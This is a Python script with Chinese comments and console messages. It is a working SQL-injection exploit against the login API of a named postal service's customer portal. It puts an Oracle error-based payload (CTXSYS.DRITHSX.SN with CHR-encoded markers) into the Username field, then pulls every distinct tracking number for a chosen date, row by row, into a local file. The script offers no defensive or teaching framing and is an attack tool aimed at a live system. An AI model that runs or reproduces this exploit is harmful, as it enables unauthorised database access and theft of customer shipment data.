#!/usr/bin/env python3
"""
从数据库快速导出所有运单号（不验证）
单线程，稳定可靠
"""
import requests
import json
import time

target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

def inject(payload):
    session = requests.Session()
    session.headers.update({'Content-Type': 'application/json'})
    data = {"Username": payload, "Password": "test"}
    try:
        return session.post(target_url, json=data, timeout=20)
    except:
        return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    r = inject(payload)
    if r and r.text and 'qjvjq' in r.text:
        try:
            s = r.text.index('qjvjq') + 5
            return r.text[s:r.text.index('qkvzq', s)]
        except:
            pass
    return None

print("=" * 80)
print("📦 快速导出所有运单号（用于批量验证）")
print("=" * 80)

# 1. 连接
print("\n🔌 连接中...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

# 2. 获取日期和统计
date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
print(f"\n📅 日期: {date}")

# 查询昨天
yesterday = str(int(date) - 1)

print(f"\n选择日期:")
print(f"  1. 今天 ({date})")
print(f"  2. 昨天 ({yesterday})")

choice = input("\n请选择 (1/2, 回车=昨天): ").strip() or '2'
target_date = date if choice == '1' else yesterday

print(f"\n✅ 选择: {target_date}")

# 统计
print(f"\n📊 统计数量...")
total = extract(f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{target_date}' AND ITEMCODE LIKE 'E%VN'")

if not total:
    print("❌ 查询失败")
    exit(1)

total_num = int(total)
print(f"✅ 总数: {total_num} 个")

estimated = total_num * 0.3 / 60
print(f"⏱️  预计: {estimated:.0f} 分钟")

output_file = f'all_tracking_{target_date}.txt'
print(f"💾 输出: {output_file}")

confirm = input(f"\n开始导出 {total_num} 个运单号？(y/n): ").strip().lower()
if confirm != 'y':
    print("❌ 已取消")
    exit(0)

# 3. 导出
print(f"\n🚀 开始导出...\n")

start_time = time.time()
success = 0
fail = 0

with open(output_file, 'w') as f:
    for i in range(1, total_num + 1):
        if i % 100 == 0:
            elapsed = time.time() - start_time
            speed = i / elapsed * 60
            remaining = (total_num - i) / speed * 60
            print(f"  {i}/{total_num} ({i*100//total_num}%) | "
                  f"成功: {success} | 失败: {fail} | "
                  f"速度: {speed:.0f}/分 | 剩余: {remaining:.0f}分")
        
        query = (
            f"SELECT ITEMCODE FROM "
            f"(SELECT ITEMCODE,ROWNUM AS RN FROM "
            f"(SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS "
            f"WHERE TOKENDATE='{target_date}' AND ITEMCODE LIKE 'E%VN' "
            f"ORDER BY ITEMCODE) "
            f"WHERE ROWNUM<={i}) WHERE RN={i}"
        )
        
        result = extract(query)
        
        if result and len(result) > 10:
            f.write(result.strip() + '\\n')
            f.flush()
            success += 1
        else:
            fail += 1
        
        time.sleep(0.05)

elapsed = time.time() - start_time

print()
print("=" * 80)
print("✅ 完成！")
print("=" * 80)
print(f"📁 文件: {output_file}")
print(f"✅ 成功: {success}")
print(f"❌ 失败: {fail}")
print(f"⏱️  用时: {elapsed/60:.0f} 分钟")
print("=" * 80)
print()
print("💡 现在用你的批量查询脚本验证这些运单号！")
print(f"   python your_script.py {output_file}")
